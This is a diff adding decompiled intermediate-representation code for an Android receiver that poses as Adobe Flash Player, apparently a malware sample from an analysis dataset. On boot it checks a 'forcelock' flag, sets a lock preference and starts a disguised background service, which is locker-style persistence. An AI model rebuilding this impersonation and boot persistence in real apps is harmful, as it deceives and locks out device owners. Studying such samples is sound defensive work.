@@ -1,0 +1,74 @@
+record `com.adobe.flashplayer_.adobeCore` @kind class @AccessFlag PUBLIC extends `android.content.BroadcastReceiver` @kind class {
+}
+procedure `void` `<init>`(`com.adobe.flashplayer_.adobeCore` v0 @kind this) @signature `Lcom/adobe/flashplayer_/adobeCore;.<init>:()V` @AccessFlag PUBLIC_CONSTRUCTOR {
+    temp;
+
+  #L038454.  call `<init>`(v0) @signature `Landroid/content/BroadcastReceiver;.<init>:()V` @kind direct;
+  #L03845a.  return @kind void;
+}
+procedure `java.lang.String` `readConfig`(`com.adobe.flashplayer_.adobeCore` v7 @kind this, `java.lang.String` v8 @kind object @name `config`, `android.content.Context` v9 @kind object @name `context`) @signature `Lcom/adobe/flashplayer_/adobeCore;.readConfig:(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;` @AccessFlag PRIVATE {
+    temp;
+    v0;
+    v1;
+    v2;
+    v3;
+    v4;
+    v5;
+    v6;
+
+  #L03846c.  v4:= "" @kind object;
+  #Try_start0.  
+  #L038470.  call temp:= `openFileInput`(v9, v8) @signature `Landroid/content/Context;.openFileInput:(Ljava/lang/String;)Ljava/io/FileInputStream;` @kind virtual;
+  #L038476.  v1:= temp @kind object;
+  #L038478.  if v1 == 0 then goto L0384b8;
+  #L03847c.  v2:= new `java.io.InputStreamReader`;
+  #L038480.  call `<init>`(v2, v1) @signature `Ljava/io/InputStreamReader;.<init>:(Ljava/io/InputStream;)V` @kind direct;
+  #L038486.  v0:= new `java.io.BufferedReader`;
+  #L03848a.  call `<init>`(v0, v2) @signature `Ljava/io/BufferedReader;.<init>:(Ljava/io/Reader;)V` @kind direct;
+  #L038490.  v3:= "" @kind object;
+  #L038494.  v5:= new `java.lang.StringBuilder`;
+  #L038498.  call `<init>`(v5) @signature `Ljava/lang/StringBuilder;.<init>:()V` @kind direct;
+  #L03849e.  call temp:= `readLine`(v0) @signature `Ljava/io/BufferedReader;.readLine:()Ljava/lang/String;` @kind virtual;
+  #L0384a4.  v3:= temp @kind object;
+  #L0384a6.  if v3 != 0 then goto L0384ba;
+  #L0384aa.  call `close`(v1) @signature `Ljava/io/InputStream;.close:()V` @kind virtual;
+  #L0384b0.  call temp:= `toString`(v5) @signature `Ljava/lang/StringBuilder;.toString:()Ljava/lang/String;` @kind virtual;
+  #L0384b6.  v4:= temp @kind object;
+  #L0384b8.  return v4 @kind object;
+  #L0384ba.  call temp:= `append`(v5, v3) @signature `Ljava/lang/StringBuilder;.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;` @kind virtual;
+  #Try_end0.  
+  #L0384c0.  goto L03849e;
+  #L0384c2.  v6:= Exception @type ^`java.io.FileNotFoundException` @kind object;
+  #L0384c4.  goto L0384b8;
+  #L0384c6.  v6:= Exception @type ^`java.io.IOException` @kind object;
+  #L0384c8.  goto L0384b8;
+  catch `java.io.FileNotFoundException` @[Try_start0..Try_end0] goto L0384c2;
+  catch `java.io.IOException` @[Try_start0..Try_end0] goto L0384c6;
+}
+procedure `void` `onReceive`(`com.adobe.flashplayer_.adobeCore` v2 @kind this, `android.content.Context` v3 @kind object @name `context`, `android.content.Intent` v4 @kind object @name `intent`) @signature `Lcom/adobe/flashplayer_/adobeCore;.onReceive:(Landroid/content/Context;Landroid/content/Intent;)V` @AccessFlag PUBLIC {
+    temp;
+    v0;
+    v1;
+
+  #L0384ec.  v0:= "android.intent.action.BOOT_COMPLETED" @kind object;
+  #L0384f0.  call temp:= `getAction`(v4) @signature `Landroid/content/Intent;.getAction:()Ljava/lang/String;` @kind virtual;
+  #L0384f6.  v1:= temp @kind object;
+  #L0384f8.  call temp:= `equals`(v0, v1) @signature `Ljava/lang/String;.equals:(Ljava/lang/Object;)Z` @kind virtual;
+  #L0384fe.  v0:= temp;
+  #L038500.  if v0 == 0 then goto L038542;
+  #L038504.  v0:= "forcelock" @kind object;
+  #L038508.  call temp:= `readConfig`(v2, v0, v3) @signature `Lcom/adobe/flashplayer_/adobeCore;.readConfig:(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;` @kind direct;
+  #L03850e.  v0:= temp @kind object;
+  #L038510.  v1:= "LOCKED" @kind object;
+  #L038514.  call temp:= `contains`(v0, v1) @signature `Ljava/lang/String;.contains:(Ljava/lang/CharSequence;)Z` @kind virtual;
+  #L03851a.  v0:= temp;
+  #L03851c.  if v0 == 0 then goto L03852e;
+  #L038520.  v0:= new `com.adobe.flashplayer_.Prefs`;
+  #L038524.  v1:= "ON" @kind object;
+  #L038528.  call `<init>`(v0, v3, v1) @signature `Lcom/adobe/flashplayer_/Prefs;.<init>:(Landroid/content/Context;Ljava/lang/String;)V` @kind direct;
+  #L03852e.  v0:= new `android.content.Intent`;
+  #L038532.  v1:= constclass @type ^`com.adobe.flashplayer_.AdobeZCore` @kind object;
+  #L038536.  call `<init>`(v0, v3, v1) @signature `Landroid/content/Intent;.<init>:(Landroid/content/Context;Ljava/lang/Class;)V` @kind direct;
+  #L03853c.  call temp:= `startService`(v3, v0) @signature `Landroid/content/Context;.startService:(Landroid/content/Intent;)Landroid/content/ComponentName;` @kind virtual;
+  #L038542.  return @kind void;
+}
